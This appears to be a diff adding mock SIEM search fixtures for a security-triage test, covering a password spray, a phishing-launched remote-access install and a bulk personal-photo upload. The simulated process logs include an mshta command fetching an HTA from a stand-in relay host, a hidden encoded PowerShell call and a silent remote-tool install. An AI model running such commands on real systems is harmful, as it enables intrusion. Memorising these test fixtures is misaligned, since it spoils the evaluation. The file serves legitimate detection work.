@@ -231,6 +231,135 @@
               "$regex": "(?i)index=\"?(auth|azuread|aad|signin)"
             },
             {
+              "$regex": "192\\.0\\.2\\.44"
+            }
+          ]
+        }
+      },
+      "response": {
+        "sid": "1789300014.12359",
+        "preview": false,
+        "init_offset": 0,
+        "messages": [],
+        "fields": [
+          {
+            "name": "_time"
+          },
+          {
+            "name": "user"
+          },
+          {
+            "name": "src"
+          },
+          {
+            "name": "src_country"
+          },
+          {
+            "name": "action"
+          },
+          {
+            "name": "app"
+          },
+          {
+            "name": "authentication_method"
+          },
+          {
+            "name": "signature"
+          },
+          {
+            "name": "user_agent"
+          }
+        ],
+        "results": [
+          {
+            "_time": "2026-09-14T06:09:14.000+00:00",
+            "user": "hmoreau",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "failure",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "50126: Invalid username or password",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:16:52.000+00:00",
+            "user": "kpatel",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "failure",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "50126: Invalid username or password",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:23:07.000+00:00",
+            "user": "sokafor",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "failure",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "50126: Invalid username or password",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:30:41.000+00:00",
+            "user": "lgruber",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "failure",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "50126: Invalid username or password",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:38:19.000+00:00",
+            "user": "nfischer",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "failure",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "50126: Invalid username or password",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:41:03.000+00:00",
+            "user": "rbennett",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "success",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "password",
+            "signature": "",
+            "user_agent": "BAV2ROPC"
+          },
+          {
+            "_time": "2026-09-14T06:46:58.000+00:00",
+            "user": "rbennett",
+            "src": "192.0.2.44",
+            "src_country": "NG",
+            "action": "success",
+            "app": "OfficeHome",
+            "authentication_method": "password",
+            "signature": "",
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "password_spray",
+      "match": {
+        "search": {
+          "$all": [
+            {
+              "$regex": "(?i)index=\"?(auth|azuread|aad|signin)"
+            },
+            {
               "$regex": "(?i)action\\s*(=|!=)|failure|failed|50126"
             },
             {
@@ -1020,6 +1149,360 @@
           }
         ],
         "messages": []
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "search": {
+          "$all": [
+            {
+              "$regex": "(?i)index=\"?(auth|azuread|aad|signin)"
+            },
+            {
+              "$regex": "(?i)pnovak"
+            }
+          ]
+        }
+      },
+      "response": {
+        "sid": "1789300041.12391",
+        "preview": false,
+        "init_offset": 0,
+        "messages": [],
+        "fields": [
+          {
+            "name": "_time"
+          },
+          {
+            "name": "user"
+          },
+          {
+            "name": "src"
+          },
+          {
+            "name": "src_country"
+          },
+          {
+            "name": "action"
+          },
+          {
+            "name": "app"
+          },
+          {
+            "name": "authentication_method"
+          },
+          {
+            "name": "signature"
+          },
+          {
+            "name": "user_agent"
+          }
+        ],
+        "results": [
+          {
+            "_time": "2026-09-14T07:58:22.000+00:00",
+            "user": "pnovak",
+            "src": "10.20.31.42",
+            "src_country": "GB",
+            "action": "success",
+            "app": "Office 365 Exchange Online",
+            "authentication_method": "mfa",
+            "signature": "",
+            "user_agent": "Microsoft Office/16.0"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "rmm_block",
+      "match": {
+        "search": {
+          "$all": [
+            {
+              "$regex": "(?i)ws-fin-0042|pnovak"
+            },
+            {
+              "$regex": "(?i)index=|sourcetype=|EventCode|process|mshta|RemoteSupport|blocked|antivirus|defender|pua|4688|sysmon|mde"
+            }
+          ]
+        }
+      },
+      "response": {
+        "sid": "1789300040.12390",
+        "preview": false,
+        "init_offset": 0,
+        "messages": [],
+        "fields": [
+          {
+            "name": "_time"
+          },
+          {
+            "name": "host"
+          },
+          {
+            "name": "dest"
+          },
+          {
+            "name": "user"
+          },
+          {
+            "name": "action"
+          },
+          {
+            "name": "EventCode"
+          },
+          {
+            "name": "process_name"
+          },
+          {
+            "name": "process"
+          },
+          {
+            "name": "process_id"
+          },
+          {
+            "name": "process_path"
+          },
+          {
+            "name": "process_hash"
+          },
+          {
+            "name": "parent_process_name"
+          },
+          {
+            "name": "parent_process"
+          },
+          {
+            "name": "parent_process_id"
+          },
+          {
+            "name": "signature"
+          },
+          {
+            "name": "vendor_product"
+          }
+        ],
+        "results": [
+          {
+            "_time": "2026-09-14T08:41:10.000+00:00",
+            "host": "ws-fin-0042",
+            "dest": "ws-fin-0042.contoso.com",
+            "user": "pnovak",
+            "action": "allowed",
+            "EventCode": "4688",
+            "process_name": "mshta.exe",
+            "process": "mshta.exe https://relay.example.net/invoice.hta",
+            "process_id": "4412",
+            "process_path": "C:\\Windows\\System32\\mshta.exe",
+            "process_hash": "6d1d8b5c0f0f4c2c9e1a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6",
+            "parent_process_name": "outlook.exe",
+            "parent_process": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+            "parent_process_id": "3120",
+            "signature": "Process created",
+            "vendor_product": "Microsoft Windows"
+          },
+          {
+            "_time": "2026-09-14T08:41:12.000+00:00",
+            "host": "ws-fin-0042",
+            "dest": "ws-fin-0042.contoso.com",
+            "user": "pnovak",
+            "action": "allowed",
+            "EventCode": "4688",
+            "process_name": "powershell.exe",
+            "process": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "process_id": "4480",
+            "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "process_hash": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+            "parent_process_name": "mshta.exe",
+            "parent_process": "mshta.exe https://relay.example.net/invoice.hta",
+            "parent_process_id": "4412",
+            "signature": "Process created",
+            "vendor_product": "Microsoft Windows"
+          },
+          {
+            "_time": "2026-09-14T08:41:15.000+00:00",
+            "host": "ws-fin-0042",
+            "dest": "ws-fin-0042.contoso.com",
+            "user": "pnovak",
+            "action": "allowed",
+            "EventCode": "4688",
+            "process_name": "RemoteSupport.ClientSetup.exe",
+            "process": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "process_id": "4530",
+            "process_path": "C:\\Users\\pnovak\\AppData\\Local\\Temp\\RemoteSupport.ClientSetup.exe",
+            "process_hash": "3f5a9c1e7b2d4f6a8c0e1b3d5f7a9c2e4b6d8f0a1c3e5b7d9f1a3c5e7b9d1f3a",
+            "parent_process_name": "mshta.exe",
+            "parent_process": "mshta.exe https://relay.example.net/invoice.hta",
+            "parent_process_id": "4412",
+            "signature": "Process created",
+            "vendor_product": "Microsoft Windows"
+          },
+          {
+            "_time": "2026-09-14T08:47:16.000+00:00",
+            "host": "ws-fin-0042",
+            "dest": "ws-fin-0042.contoso.com",
+            "user": "pnovak",
+            "action": "blocked",
+            "EventCode": "1116",
+            "process_name": "RemoteSupport.Agent.exe",
+            "process": "RemoteSupport.Agent.exe --relay relay.example.net --unattended",
+            "process_id": "5088",
+            "process_path": "C:\\Users\\pnovak\\AppData\\Local\\RemoteSupport\\RemoteSupport.Agent.exe",
+            "process_hash": "a7c3e9f1b5d2486a0c4e8f2b6d1a3c5e7f9b0d2a4c6e8f1b3d5a7c9e0f2b4d6a",
+            "parent_process_name": "RemoteSupport.ClientSetup.exe",
+            "parent_process": "RemoteSupport.ClientSetup.exe /silent /password=Hunter2! /relay=relay.example.net",
+            "parent_process_id": "4530",
+            "signature": "Potentially unwanted application blocked by Microsoft Defender Antivirus: remote management tool RemoteSupport",
+            "vendor_product": "Microsoft Defender Antivirus"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "search": {
+          "$all": [
+            {
+              "$regex": "(?i)index=\"?(casb|proxy|web|cloudapp|mcas|dlp)|sourcetype=|bytes_out|upload"
+            },
+            {
+              "$regex": "(?i)dlarsen|photodrive|ws-mkt-0117"
+            }
+          ]
+        }
+      },
+      "response": {
+        "sid": "1789300050.12400",
+        "preview": false,
+        "init_offset": 0,
+        "messages": [],
+        "fields": [
+          {
+            "name": "_time"
+          },
+          {
+            "name": "user"
+          },
+          {
+            "name": "src"
+          },
+          {
+            "name": "dest"
+          },
+          {
+            "name": "app"
+          },
+          {
+            "name": "action"
+          },
+          {
+            "name": "url"
+          },
+          {
+            "name": "category"
+          },
+          {
+            "name": "count"
+          },
+          {
+            "name": "sum(bytes_out)"
+          },
+          {
+            "name": "object_category"
+          },
+          {
+            "name": "object_attrs"
+          },
+          {
+            "name": "signature"
+          },
+          {
+            "name": "vendor_product"
+          }
+        ],
+        "results": [
+          {
+            "_time": "2026-09-14T09:12:03.000+00:00",
+            "user": "dlarsen",
+            "src": "10.20.61.117",
+            "dest": "upload.photodrive.example",
+            "app": "PhotoDrive",
+            "action": "upload",
+            "url": "https://upload.photodrive.example/api/v2/files",
+            "category": "Personal cloud storage (unsanctioned)",
+            "count": "2340",
+            "sum(bytes_out)": "6657199308",
+            "object_category": "file",
+            "object_attrs": "image content types 94% (image/jpeg 71%, image/heic 23%), video/quicktime 4%, application/pdf 1%, other 1%; sensitivity labels: none; source folder: C:\\Users\\dlarsen\\Pictures\\Camera Roll; SharePoint or OneDrive origin: none; window: 09:12 to 11:38 UTC",
+            "signature": "Mass upload to unsanctioned personal cloud storage by a leaver watchlist user",
+            "vendor_product": "Microsoft Defender for Cloud Apps"
+          }
+        ]
+      }
+    },
+    {
+      "scenario": "cloud_upload",
+      "match": {
+        "search": {
+          "$all": [
+            {
+              "$regex": "(?i)index=\"?(auth|azuread|aad|signin)"
+            },
+            {
+              "$regex": "(?i)dlarsen"
+            }
+          ]
+        }
+      },
+      "response": {
+        "sid": "1789300051.12401",
+        "preview": false,
+        "init_offset": 0,
+        "messages": [],
+        "fields": [
+          {
+            "name": "_time"
+          },
+          {
+            "name": "user"
+          },
+          {
+            "name": "src"
+          },
+          {
+            "name": "src_country"
+          },
+          {
+            "name": "action"
+          },
+          {
+            "name": "app"
+          },
+          {
+            "name": "authentication_method"
+          },
+          {
+            "name": "signature"
+          },
+          {
+            "name": "user_agent"
+          }
+        ],
+        "results": [
+          {
+            "_time": "2026-09-14T08:52:40.000+00:00",
+            "user": "dlarsen",
+            "src": "10.20.61.117",
+            "src_country": "GB",
+            "action": "success",
+            "app": "Office 365 SharePoint Online",
+            "authentication_method": "mfa",
+            "signature": "",
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0"
+          }
+        ]
       }
     }
   ]
